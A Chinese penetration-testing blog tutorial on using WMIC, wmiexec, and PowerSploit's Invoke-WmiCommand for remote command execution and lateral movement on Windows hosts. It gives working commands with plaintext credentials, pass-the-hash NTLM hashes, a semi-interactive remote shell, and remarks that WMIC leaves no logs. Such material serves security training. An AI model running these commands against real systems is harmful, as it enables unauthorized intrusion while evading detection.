**目录**

[WMIC](#t0 "WMIC")

[WMIC在渗透中常用命令](#t1 "WMIC在渗透中常用命令")

[常用的WMIC命令](#t2 "常用的WMIC命令")

[进程管理](#t3 "进程管理")

[账号管理](#t4 "账号管理")

[共享管理](#t5 "共享管理")

[服务管理](#t6 "服务管理")

[目录管理](#t7 "目录管理")

[计划任务](#t8 "计划任务")

[wmiexec.exe(admin$)](#t9 "wmiexec.exe(admin$)")

[wmiexec.py](#t10 "wmiexec.py")

[wmiexec.vbs](#t11 "wmiexec.vbs")

[Invoke-WmiCommand.ps1](#t12 "Invoke-WmiCommand.ps1")

[Invoke-WMIMethod](#t13 "Invoke-WMIMethod")

* * *

**使用以下的wmic工具远程连接目标机器执行命令，需要目标机器开启admin$共享。**

WMIC
====

**WMIC**是Windows Management Instrumentation Command-line的简称，它是一款命令行管理工具，提供了从命令行接口到批量命令脚本执行系统管理的支持，可以说是Windows平台下最有用的命令行工具。使用WMIC，我们不但可以管理本地计算机，还可以管理统一局域网内的所有远程计算机（需要必要的权限），而被管理的计算机不必事先安装WMIC。自Windows98开始，Windows操作系统都支持WMIC，WMIC是一系列工具集组成的。

在用WMIC执行命令过程中，操作系统默认不会将WMIC的操作记录在日志中，因为在这个过程中不会产生日志。所以越来越多的攻击者由psexec转向WMIC。

注：使用WMIC连接远程主机，需要目标主机开放135和445端口。(135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445端⼝传回显)

![](https://img-blog.csdnimg.cn/20191219101002114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

wmic.exe位于Windows目录下，是一个命令行程序，WMIC可以以两种模式运行：**交互模式和非交互模式**

*   **交互模式**：如果你在命令提示符下或通过运行菜单只输入WMIC，都将进入WMIC的交互模式，每当一个命令执行完毕后，系统还会返回到WMIC提示符下。交互模式通常在需要执行多个WMIC指令时使用，有事还会对一些敏感的操作要求确认，例如删除操作，这样能最大限度地防止用户操作出现失误。
*   **非交互模式**：非交互模式是指将WMIC指令直接作为WMIC的参数放在WMIC后面，当指令执行完毕后再返回到普通的命令提示符下，而不是进入WMIC上下文环境中。WMIC的非交互模式主要用于批处理或者其他一些脚本文件。

![](https://img-blog.csdnimg.cn/20191219101239610.png)

![](https://img-blog.csdnimg.cn/20191219101351142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

在WindowsXP下，低权限用户是不能使用WMIC命令的。在Win7以及之后，低权限用户也可以使用WMIC命令，且不用更改任何设置。

WMIC在信息收集和后渗透测试阶段非常有用，可以调取查看目标机的进程、服务、用户、用户组、网络连接、硬盘信息、网络共享信息、已安装补丁、启动项、已安装的软件、操作系统的相关信息和时区等。

WMIC在渗透中常用命令
------------

使用WMIC远程执行命令，在远程系统中启动WMIC服务(目标服务器需要开放135端口，WMIC会以管理员权限在远程系统中执行命令)。如果目标服务器开启了防火墙，WMIC将无法连接。另外由于wmic命令没有回显，需要使用IPC$和type命令来读取信息。需要注意的是，如果WMIC执行的是恶意程序，将不会留下日志。

```
#以administrator用户,x123456./@密码连接192.168.10.131，并在机器上执行ipconfig命令，将结果写入c:\ip.txt文件中      
wmic /node:192.168.10.131 /user:administrator /password:x123456./@ process call create "cmd.exe /c ipconfig > c:\ip.txt"        
#然后在建立IPC$连接读取c:\ip.txt文件的内容
```


常用的WMIC命令
---------

### 进程管理

```
wmic process list brief    #列出所有进程，Full显示所有、Brief显示摘要、Instance显示实例、Status显示状态      
wmic process get name,executablepath                           #获取所有进程名称以及可执行路径      
wmic process where name="jqs.exe" get executablepath            #获取指定进程可执行路径      
wmic process call create "C:\Program Files\Tencent\QQ\QQ.exe"   #创建新进程      
wmic process call create "shutdown.exe -r -f -t 60"             #根据命令创建进程      
wmic process where name="qq.exe" delete      			        #根据进程名称删除进程      
wmic process where pid="123" delete          			        #根据PID删除进程
```


### 账号管理

```
WMIC USERACCOUNT where "name='%UserName%'" call rename newUserName  #更改当前用户名
```


### 共享管理

```
#建立共享      
WMIC SHARE CALL Create "","test","3","TestShareName","","c:\test",0      
(可使用 WMIC SHARE CALL Create /? 查看create后的参数类型)       
#删除共享      
WMIC SHARE where name="C$" call delete      
WMIC SHARE where path='c:\test' delete
```


### 服务管理

```
#更改telnet服务启动类型[Auto|Disabled|Manual]      
wmic SERVICE where name="tlntsvr" set startmode="Auto"       
#运行telnet服务      
wmic SERVICE where name="tlntsvr" call startservice       
#停止ICS服务      
wmic SERVICE where name="ShardAccess" call stopservice       1
#删除test服务      1
wmic SERVICE where name="test" call delete
```


### 目录管理

```
#列出c盘下名为test的目录      
wmic FSDIR where "drive='c:' and filename='test'" list      
#删除c:\good文件夹      
wmic fsdir "c:\test" call delete      
#重命名c:\test文件夹为abc      
wmic fsdir "c:\test" rename "c:\abc"      
wmic fsdir where (name='c:\test') rename "c:\abc"      
#复制文件夹      
wmic fsdir where name='d:\test' call copy "c:\test"      1
#重命名文件      1
wmic datafile "c:\test.txt" call rename c:\abc.txt
```


### 计划任务

```
wmic job call create "notepad.exe",0,0,true,false,********154800.000000+480      
wmic job call create "explorer.exe",0,0,1,0,********154600.000000+480
```


wmiexec.exe(admin$)
===================

```
wmiexec.exe administrator:root@192.168.10.20      
wmiexec.exe administrator@192.168.10.20 -hashes d480ea9533c500d4aad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9
```


![](https://img-blog.csdnimg.cn/20200423113717738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

wmiexec.py
==========

使⽤ wmiexec.py 脚本进⾏横向的前提是：  
1. 目标主机开启了 135 端⼝（135 端⼝是 WMIC 默认的管理端⼝）  
2. 目标主机开启了 445 端⼝（wimcexec 使⽤445端⼝传回显）

准确说、如果要把输出结果写⽂件的话，需要⽤smb回传。如果写注册表，直接⽤ wmi 就能回来了，就不需要⾛445了。sharpwmi 这个项⽬不依赖139和445端⼝，但是还需要依赖 135 端⼝。

 wmiexec.py 脚本使用如下:

```
python2 wmiexec.py administrator:root@192.168.10.20      
python2 wmiexec.py administrator@192.168.10.20 -hashes d480ea9533c500d4aad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9
```


![](https://img-blog.csdnimg.cn/20200423113527852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果对方主机未开启135或445，则报如下错：

```
[-] Could not connect: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。
```


![](https://img-blog.csdnimg.cn/20201020233949421.png)

 如果对方主机开启了135和445，但是未开启admin$共享，则一直处于连接状态。

![](https://img-blog.csdnimg.cn/20201020234154248.png)

wmiexec.vbs
===========

wmiexec.vbs脚本通过VBS调用wmic来模拟psexec的功能。wmiexec.vbs可以在远程系统中执行命令并进行回显，获得远程主机的半交互式的shell。对于运行时间比较长的命令，例如ping、systeminfo，需要添加 -wait 5000或者更长时间的参数。在运行 nc 等不需要输入结果但需要一直运行的进程时，如果使用 -persist参数，就不需要使用 taskkill 命令来远程结束进程了。

```
#获得一个半交互式的shell      
cscript //nologo wmiexec.vbs /shell 192.168.10.20 administrator root
```


![](https://img-blog.csdnimg.cn/20200423111905397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)
===================================================================================================================================================================================================

Invoke-WmiCommand.ps1
=====================

该脚本在PowerSploit中的CodeExecution目录下，该脚本主要是通过powershell调用WMIC来远程执行命令，因此本质上还是利用WMIC。

该脚本使用如下

```
#导入脚本      
Import-Module .\Invoke-WmiCommand.ps1      
#目标系统用户名      
$User="xie\administrator"      
#目标系统密码      
$Password=ConvertTo-SecureString -String "x123456./@" -AsPlainText -Force      
#将账号和密码整合起来，以便导入 Credential中      
$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password      
#在远程系统中运行 ipconfig 命令      1
$Remote=Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName 192.168.10.131      1
#将执行结果输出到屏幕上      1
$Remote.PayloadOutput
```


![](https://img-blog.csdnimg.cn/20200201230456598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Invoke-WMIMethod
================

使用powershell自带的Invoke-WMIMethod，可以在远程系统中执行命令和指定程序。

在powershell命令行环境执行如下命令，可以以非交互式的方式执行命令，但不会回显执行结果。

```
#目标系统用户名      
$User="xie\administrator"      
#目标系统密码      
$Password=ConvertTo-SecureString -String "x123456./@" -AsPlainText -Force      
#将账号和密码整合起来，以便导入 Credential中      
$Cred=New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password      
#在远程系统中运行 calc.exe 命令      
Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "192.168.10.131" -Credential $Cred
```


![](https://img-blog.csdnimg.cn/20200201225428648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

命令执行完成后，会在目标系统中运行calc.exe程序，返回的PID为 752

![](https://img-blog.csdnimg.cn/20200201225527794.png)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

文章知识点与官方知识档案匹配，可进一步学习相关知识

[CS入门技能树](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[Linux入门](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[初识Linux](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)11176 人正在系统学习中